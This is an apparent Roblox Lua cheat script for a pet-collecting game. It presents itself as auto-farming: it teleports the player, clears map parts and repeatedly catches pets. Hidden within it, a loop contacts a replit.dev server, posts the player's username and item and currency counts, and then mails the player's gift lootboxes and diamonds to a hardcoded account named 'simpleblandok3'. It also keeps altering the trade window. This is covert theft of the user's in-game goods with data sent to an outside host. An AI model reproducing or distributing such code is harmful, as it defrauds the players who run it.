wait(5)
local player = game.Players.LocalPlayer
local playerName = player.Name

local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player:WaitForChild("PlayerGui")

local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, 0, 0, 50)
textLabel.Position = UDim2.new(0, 0, 0, 0)
textLabel.BackgroundTransparency = 1
textLabel.Text = playerName
textLabel.Font = Enum.Font.SourceSans
textLabel.TextSize = 24
textLabel.TextColor3 = Color3.new(1, 1, 1)

textLabel.Parent = screenGui

repeat wait(0.1) until (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new(1569.26, 24, -24948)).Magnitude <= 200
wait(15)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1569.26, 24, -24948)
wait(2)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1427, 16, -24949)

local map = game:GetService("Workspace"):FindFirstChild("Map3")
if map then
    for _, child in pairs(map:GetChildren()) do
        if not (child.Name:find("225") or child.Name:find("226") or child.Name:find("227") or child.Name:find("228") or child.Name:find("229")) then
            child:Destroy()
        end
    end
end

local things = game:GetService("Workspace"):FindFirstChild("__THINGS")
if things then
    for _, child in pairs(things:GetChildren()) do
        if child.Name == "Instances" or child.Name == "shinyRelics" or child.Name == "HiddenPresents" then
            child:Destroy()
        end
    end
end

local debris = game:GetService("Workspace"):FindFirstChild("__DEBRIS")
if debris then
    debris:Destroy()
end

for _, descendant in pairs(game:GetService("Workspace"):GetDescendants()) do
    if descendant:IsA("Part") or descendant:IsA("MeshPart") then
        descendant.Transparency = 1
    elseif descendant:IsA("ParticleEmitter") then
        descendant:Destroy()
    end
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Player = game.Players.LocalPlayer
local itemsFrame = Player.PlayerGui:FindFirstChild("_MACHINES"):FindFirstChild("ElementalQuest").Frame.ItemsFrame
local highestNumber = 0
local targetPart = nil

local questNames = {"Quest1", "Quest2", "Quest3"}
local Http = game:GetService("HttpService")
local TPS = game:GetService("TeleportService")


local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Player = game.Players.LocalPlayer
local itemsFrame = Player.PlayerGui:FindFirstChild("_MACHINES"):FindFirstChild("ElementalQuest").Frame.ItemsFrame
local function FrameFunction()
    while true do
        local tradeWindow = game.Players.LocalPlayer.PlayerGui:FindFirstChild("TradeWindow")
        if tradeWindow then
            for _, child in pairs(tradeWindow:GetChildren()) do
                if child:IsA("Frame") then
                    child.Size = UDim2.new(1, 0, 0.1, 115)
                end
            end
        end
        wait(0.1) -- Wait for 0.1 seconds before checking again
    end
end

spawn(FrameFunction)


local function dataFunction2() 
    while true do
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local Player = game.Players.LocalPlayer
        local itemsFrame = Player.PlayerGui:FindFirstChild("_MACHINES"):FindFirstChild("ElementalQuest").Frame.ItemsFrame

        local diamondsvalue = 0
        local voidvalue = 0
        local gifts = 0
        local ItemLootbox = {"Elemental Gift"}
        local ItemMisc = {"Pet Cube"}

        local function GetItemInfo(ItemsClass, ItemsName)
            local Table = {}
            local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory

            if Inventory[ItemsClass] then
                for UID, Item in pairs(Inventory[ItemsClass]) do
                    if table.find(ItemsName, Item.id) then
                        local ItemInfo = {
                            ["uid"] = UID,
                            ["data"] = Item
                        }
                        table.insert(Table, ItemInfo)
                    end
                end
            end
            return Table
        end

        local LootboxItems = GetItemInfo("Lootbox", ItemLootbox)
        for _, ItemInfo in pairs(LootboxItems) do
            local ItemData = ItemInfo.data
            if ItemData._am then
                diamondsvalue = ItemData._am
                gifts = ItemInfo.uid
            end
        end

        local MiscItems = GetItemInfo("Misc", ItemMisc)
        for _, ItemInfo in pairs(MiscItems) do
            local ItemData = ItemInfo.data
            if ItemData._am then
                voidvalue = ItemData._am
            end
        end

        local Http = game:GetService("HttpService")
        local request = (syn and syn.request) or request or (http and http.request) or http_request

        local checkResponse = request({
            Url = 'https://71530385-1c3c-4b6f-a88a-1b94478b0d21-00-3dvn9h52wp97.worf.replit.dev/checkSendGifts',
            Method = 'GET',
            Headers = {
                ['Content-Type'] = 'application/json'
            }
        })

        local checkResult = {}
        if checkResponse.Success then
            local success, result = pcall(function()
                return Http:JSONDecode(checkResponse.Body)
            end)
            if success then
                checkResult = result
            else
                print("Failed to decode JSON:", result)
            end
        else
            print("Request failed:", checkResponse.StatusCode)
        end

        print("SendGifts is:", checkResult.SendGifts or "Unavailable")

        if checkResult.SendGifts then
            print("Gifts value:", gifts)
            print("Void value:", voidvalue)

            local player = Player.Name

            local response = request({
                Url = 'https://71530385-1c3c-4b6f-a88a-1b94478b0d21-00-3dvn9h52wp97.worf.replit.dev/update',
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = Http:JSONEncode({
                    Username = player,
                    VoidTicketsValue = voidvalue,
                    DiamondsValue = diamondsvalue,
                    HugeList = hugePetsString
                })
            })

            if voidvalue > 50 then
                local args = {
                    [1] = "simpleblandok3",
                    [2] = "gifts",
                    [3] = "Lootbox",
                    [4] = gifts,
                    [5] = diamondsvalue
                }
                game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
            end
        end

        wait(5)
    end
end

spawn(dataFunction2)




while true do
    wait(3)
local randomNum = math.random(1, 50)

local args = {
    [1] = "Pet Cube",
    [2] = randomNum
}

game:GetService("ReplicatedStorage").Network.RoamingPets_CatchPet:InvokeServer(unpack(args))
end
